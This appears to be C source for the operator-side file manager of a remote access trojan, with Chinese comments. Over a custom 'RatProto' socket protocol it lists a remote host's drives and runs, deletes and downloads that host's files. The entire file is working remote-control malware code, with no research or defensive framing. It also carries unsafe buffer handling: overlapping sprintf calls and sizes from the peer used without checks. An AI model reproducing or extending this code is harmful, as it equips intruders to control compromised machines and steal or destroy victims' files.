#include "FileMgr.h"

HWND hFmgrList = NULL;
HWND hFmgrSBar = NULL;
char szTempPath[MAX_PATH] = {0};
int dwFileSize = 0;
char* pFileData = NULL;
//extern BOOL bMutex;
extern char szFname[MAX_PATH];
char *FileType[] = {"FOLDER","FILE","DRIVE","EXE"};
//////////////////////////////////////////////////////////////////////////
//获得远程主机盘符
//////////////////////////////////////////////////////////////////////////
BOOL SendDriveList(SOCKET sockfd)
{
	memset(szTempPath,0,MAX_PATH);
	RatProto ratPro;
	ratPro.RatId = FILE_VIEW;
	ratPro.RatLen = sizeof(RatProto);

	SendCmd(sockfd,(char*)(&ratPro),sizeof(RatProto));

	return TRUE;
}


//////////////////////////////////////////////////////////////////////////
//初始化ListControl
//////////////////////////////////////////////////////////////////////////
BOOL InitFmgrList(HWND hList)
{
	//全局IDC_LIST1
	hFmgrList = hList;
	LVCOLUMN lvCol;
	char *szColumn[]= {"文件类型", "文件名称"};
	int width[]= {100,290};

	ZeroMemory(&lvCol, sizeof(LVCOLUMN));

	lvCol.mask= LVCF_TEXT | LVCF_SUBITEM | LVCF_WIDTH | LVCF_FMT;
	lvCol.fmt= LVCFMT_LEFT;
	ListView_SetExtendedListViewStyleEx(hList,0 , LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES | LVS_EX_HEADERDRAGDROP);

	for(int i=0; i<2; i++ )
	{
		lvCol.iSubItem= i;
		lvCol.cx= width[i];
		lvCol.pszText= szColumn[i];

		ListView_InsertColumn(hList, i, &lvCol);
	}

	return TRUE;
}

//////////////////////////////////////////////////////////////////////////
//初始化状态栏
//////////////////////////////////////////////////////////////////////////
BOOL UpdataSBar(HWND hDlg)
{
	hFmgrSBar = CreateStatusWindow(WS_CHILD|WS_VISIBLE|SBARS_SIZEGRIP,NULL,hDlg,ID_STATUSBAR);
	//更新状态栏
	SendMessage(hFmgrSBar,SB_SETTEXT,NULL,(LPARAM)szTempPath);

	return TRUE;
}


//////////////////////////////////////////////////////////////////////////
//打开文件
//////////////////////////////////////////////////////////////////////////
BOOL FileOpen(SOCKET sockfd,char* szFile,char* szType)
{
	RatProto ratPro;
	if (strcmp(szType,"EXE")==0)
	{
		ratPro.RatId = FILE_EXCUTE;
		sprintf(szTempPath,"%s%s",szTempPath,szFile);
	}
	else if (strcmp(szType,"DRIVE")==0)
	{	
		ratPro.RatId = FILE_OPEN;
		sprintf(szTempPath,"%s*",szFile);
	}
	else
	{
		ratPro.RatId = FILE_OPEN;
		sprintf(szTempPath,"%s%s\\*",szTempPath,szFile);
	}
	ratPro.RatLen = sizeof(RatProto)+MAX_PATH;
	SendCmd(sockfd,(char*)(&ratPro),sizeof(RatProto));
	Sleep(100);
	SendCmd(sockfd,szTempPath,MAX_PATH);


	return TRUE;
}


//////////////////////////////////////////////////////////////////////////
//删除文件
//////////////////////////////////////////////////////////////////////////
BOOL FileDelete(SOCKET sockfd,char* szFile)
{
	RatProto ratPro;
	ratPro.RatId = FILE_DELETE;
	ratPro.RatLen = sizeof(RatProto)+MAX_PATH;
	SendCmd(sockfd,(char*)(&ratPro),sizeof(RatProto));
	sprintf(szTempPath,"%s%s\0",szTempPath,szFile);
	SendCmd(sockfd,szTempPath,MAX_PATH);

	return TRUE;
}


//////////////////////////////////////////////////////////////////////////
//返回上一级
//////////////////////////////////////////////////////////////////////////
BOOL FolderBack(SOCKET sockfd)
{
	RatProto ratPro;
	ratPro.RatId = FILE_BACK;
	ratPro.RatLen = sizeof(RatProto)+MAX_PATH;
	SendCmd(sockfd,(char*)(&ratPro),sizeof(RatProto));
	Sleep(100);
	SendCmd(sockfd,szTempPath,MAX_PATH);

	return TRUE;
}


//////////////////////////////////////////////////////////////////////////
//刷新文件列表
//////////////////////////////////////////////////////////////////////////
BOOL FileView(SOCKET sockfd,int dwRecvSize)
{
	ListView_DeleteAllItems(hFmgrList);
	LVITEM lvItem;
	lvItem.mask =  LVIF_TEXT;

	int count = (((RatProto*)szRecvCmd)->RatLen - sizeof(RatProto))/sizeof(FileInfo);
	FileInfo* fi = (FileInfo*)(szRecvCmd+sizeof(RatProto));
	for (int i=0;i<count;i++)
	{
		lvItem.iItem = i;
		//类型
		lvItem.iSubItem = 0;
		lvItem.pszText = GetFileType(fi->Type);
		ListView_InsertItem(hFmgrList,&lvItem);
		//名称
		lvItem.iSubItem = 1;
		lvItem.pszText = fi->Name;
		ListView_SetItem(hFmgrList,&lvItem);
		//下一条记录
		fi++;
	}

	return TRUE;
}


//////////////////////////////////////////////////////////////////////////
//接收文件操作反馈信息
//////////////////////////////////////////////////////////////////////////
BOOL FileReply(SOCKET sockfd,int dwRecvSize)
{
	int dwSize = ((RatProto*)szRecvCmd)->RatLen;
	memset(szTempPath,0,MAX_PATH);
	sprintf(szTempPath,"%s",szRecvCmd+sizeof(RatProto));
	//更新状态栏
	SendMessage(hFmgrSBar,SB_SETTEXT,NULL,(LPARAM)szTempPath);
	if (dwSize>sizeof(RatProto)+MAX_PATH)
	{
		char szMsg[NAMESIZE] = {0};
		sprintf(szMsg,"%s",szRecvCmd+sizeof(RatProto)+MAX_PATH);
		MessageBox(NULL,szMsg,NULL,NULL);	
	}
	return TRUE;
}


//////////////////////////////////////////////////////////////////////////
//获得文件类型
//////////////////////////////////////////////////////////////////////////
char* GetFileType(int type)
{
	return FileType[type];
}


//////////////////////////////////////////////////////////////////////////
//下载文件
//////////////////////////////////////////////////////////////////////////
BOOL FileDownLoad(SOCKET sockfd,char* szFile)
{
	RatProto ratPro;
	ratPro.RatId = FILE_DOWNLOAD;
	ratPro.RatLen = sizeof(RatProto)+MAX_PATH;
	SendCmd(sockfd,(char*)(&ratPro),sizeof(RatProto));
	sprintf(szTempPath,"%s%s\0",szTempPath,szFile);
	SendCmd(sockfd,szTempPath,MAX_PATH);

	return TRUE;
}

//////////////////////////////////////////////////////////////////////////
//为文件传输做准备
//////////////////////////////////////////////////////////////////////////
BOOL FileDownReply(SOCKET sockfd,int dwRecvSize)
{
	dwFileSize = ((RatProto*)szRecvCmd)->RatCsm;
	//FileReply(sockfd,dwRecvSize);
	pFileData = (char*)malloc(dwFileSize+PERSENDBYTES);
	if (pFileData)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}

}

//////////////////////////////////////////////////////////////////////////
//文件传输
//////////////////////////////////////////////////////////////////////////
BOOL FileTransmit(SOCKET sockfd,int dwRecvSize)
{
	dwFileSize = ((RatProto*)szRecvCmd)->RatCsm;
	char* pData = (char*)malloc(dwFileSize);
	int dwFileCount = 0;
	if (pData)
	{
		char* pTemp = pData;
		dwFileCount = dwFileSize;
		int rat=0,lastrat = -11;
		while (TRUE)
		{
			int nRet = recv(sockfd,pTemp,dwFileCount,NULL);
			if (nRet==SOCKET_ERROR)
			{
				if (WSAGetLastError()==WSAEWOULDBLOCK)
				{
					Sleep(10);
					continue;
				}
				else
				{
					break;
				}
			}
			pTemp += nRet;
			dwFileCount -= nRet;
			if (dwFileCount==0)
			{
				break;
			}
		}
		HANDLE hFile = CreateFile(szFname,GENERIC_WRITE,NULL,NULL,CREATE_ALWAYS,NULL,NULL);
		if (hFile!=INVALID_HANDLE_VALUE)
		{
			int dwritten = 0;
			WriteFile(hFile,pData,dwFileSize,(LPDWORD)&dwritten,NULL);
			free(pData);
			FlushFileBuffers(hFile);
			CloseHandle(hFile);
		}
	}

	return TRUE;
}